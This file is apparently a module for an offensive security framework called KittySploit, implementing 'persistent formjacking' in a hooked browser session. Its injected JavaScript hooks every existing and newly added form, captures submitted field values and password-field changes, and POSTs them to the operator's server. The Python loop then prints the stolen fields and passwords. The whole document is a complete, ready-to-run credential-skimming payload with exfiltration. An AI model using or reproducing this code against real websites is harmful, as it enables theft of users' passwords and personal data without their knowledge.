from kittysploit import *
import json
import time
import uuid


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Persistent Formjacking",
		"description": "Hook existing and dynamically added forms via MutationObserver and exfiltrate submissions",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	timeout = OptInteger(60, "Monitoring duration in seconds (0 = install only)", False)
	capture_inputs = OptBool(True, "Also capture input/change on password-like fields", False)
	redact_empty = OptBool(True, "Skip empty field values", False)

	def run(self):
		timeout_val = int(self.timeout if self.timeout is not None else 60)
		capture_inputs = self._to_bool(self.capture_inputs)
		redact_empty = self._to_bool(self.redact_empty)
		monitor_id = str(uuid.uuid4())

		code_js = f"""
		(function() {{
			const MONITOR_ID = {json.dumps(monitor_id)};
			const CAPTURE_INPUTS = {str(capture_inputs).lower()};
			const REDACT_EMPTY = {str(redact_empty).lower()};

			if (window.__ksFormjack && window.__ksFormjack.active) {{
				return 'Formjack already active';
			}}

			let SERVER_HOST = '127.0.0.1';
			let SERVER_PORT = '8080';
			if (window.kittysploit) {{
				if (typeof window.kittysploit.getServerHost === 'function') {{
					SERVER_HOST = window.kittysploit.getServerHost();
				}}
				if (typeof window.kittysploit.getServerPort === 'function') {{
					SERVER_PORT = window.kittysploit.getServerPort();
				}}
			}}

			function sessionId() {{
				if (window.kittysploit && typeof window.kittysploit.sessionId === 'function') {{
					return window.kittysploit.sessionId();
				}}
				return null;
			}}

			function send(payload) {{
				const data = {{
					session_id: sessionId(),
					command_id: MONITOR_ID,
					result: JSON.stringify(payload),
					timestamp: new Date().toISOString()
				}};
				fetch('http://' + SERVER_HOST + ':' + SERVER_PORT + '/api/command', {{
					method: 'POST',
					headers: {{ 'Content-Type': 'application/json' }},
					body: JSON.stringify(data)
				}}).catch(function() {{}});
			}}

			function serializeForm(form) {{
				const fields = [];
				const els = form.querySelectorAll('input, select, textarea');
				els.forEach(function(el) {{
					const type = (el.getAttribute('type') || el.tagName || '').toLowerCase();
					if (type === 'submit' || type === 'button' || type === 'image' || type === 'reset') return;
					let value = '';
					if (type === 'checkbox' || type === 'radio') {{
						if (!el.checked) return;
						value = el.value || 'on';
					}} else {{
						value = el.value || '';
					}}
					if (REDACT_EMPTY && !value) return;
					fields.push({{
						tag: el.tagName.toLowerCase(),
						type: type,
						name: el.name || '',
						id: el.id || '',
						autocomplete: el.getAttribute('autocomplete') || '',
						value: String(value)
					}});
				}});
				return fields;
			}}

			function hookForm(form) {{
				if (!form || form.__ksFormjacked) return;
				form.__ksFormjacked = true;
				form.addEventListener('submit', function(ev) {{
					send({{
						type: 'formjack',
						event: 'submit',
						action: form.getAttribute('action') || form.action || '',
						method: (form.getAttribute('method') || form.method || 'get').toLowerCase(),
						url: location.href,
						fields: serializeForm(form),
						timestamp: new Date().toISOString()
					}});
				}}, true);

				if (CAPTURE_INPUTS) {{
					form.addEventListener('change', function(ev) {{
						const t = ev.target;
						if (!t || !t.matches) return;
						if (!t.matches('input[type=\"password\"], input[autocomplete*=\"password\" i], input[name*=\"pass\" i]')) return;
						send({{
							type: 'formjack',
							event: 'password_change',
							url: location.href,
							field: {{
								name: t.name || '',
								id: t.id || '',
								value: String(t.value || '')
							}},
							timestamp: new Date().toISOString()
						}});
					}}, true);
				}}
			}}

			function scan(root) {{
				const scope = root && root.querySelectorAll ? root : document;
				scope.querySelectorAll('form').forEach(hookForm);
				if (root && root.tagName === 'FORM') hookForm(root);
			}}

			scan(document);

			const observer = new MutationObserver(function(mutations) {{
				mutations.forEach(function(m) {{
					m.addedNodes.forEach(function(node) {{
						if (node.nodeType !== 1) return;
						scan(node);
					}});
				}});
			}});
			observer.observe(document.documentElement, {{ childList: true, subtree: true }});

			window.__ksFormjack = {{
				active: true,
				id: MONITOR_ID,
				stop: function() {{
					observer.disconnect();
					window.__ksFormjack.active = false;
				}}
			}};

			send({{
				type: 'formjack',
				event: 'installed',
				url: location.href,
				forms_hooked: document.forms.length,
				timestamp: new Date().toISOString()
			}});

			return 'Formjack installed (' + document.forms.length + ' form(s))';
		}})();
		"""

		print_status(f"Installing persistent formjack (ID: {monitor_id[:8]}...)")
		if not self.send_js(code_js):
			print_error("Failed to install formjack")
			return False

		if timeout_val <= 0:
			print_success("Formjack installed (no wait). Events stream to browser_server responses.")
			return True

		print_status(f"Listening for form events for {timeout_val}s...")
		self._ensure_browser_server()
		start = time.time()
		seen = 0
		try:
			while time.time() - start < timeout_val:
				session = self.browser_server.get_session(self.session_id) if self.browser_server else None
				if session:
					for response in session.responses[seen:]:
						seen += 1
						if response.get("command_id") != monitor_id:
							continue
						raw = response.get("result")
						try:
							payload = json.loads(raw) if isinstance(raw, str) else raw
						except (json.JSONDecodeError, TypeError):
							continue
						if not isinstance(payload, dict) or payload.get("type") != "formjack":
							continue
						event = payload.get("event")
						if event == "installed":
							print_info(f"  Hooked initial forms: {payload.get('forms_hooked')}")
						elif event == "submit":
							print_success(
								f"  SUBMIT {payload.get('method', '').upper()} {payload.get('action')}"
							)
							for field in payload.get("fields") or []:
								print_warning(
									f"    {field.get('name') or field.get('id') or '?'}="
									f"{field.get('value')}"
								)
						elif event == "password_change":
							field = payload.get("field") or {}
							print_warning(
								f"  PASSWORD FIELD {field.get('name') or field.get('id')}: "
								f"{field.get('value')}"
							)
				time.sleep(0.5)
		except KeyboardInterrupt:
			print_status("Stopped by user")

		# Best-effort stop
		self.send_js(
			"(function(){ if(window.__ksFormjack&&window.__ksFormjack.stop){window.__ksFormjack.stop();} return 'stopped'; })();"
		)
		print_success("Formjack monitoring finished")
		return True
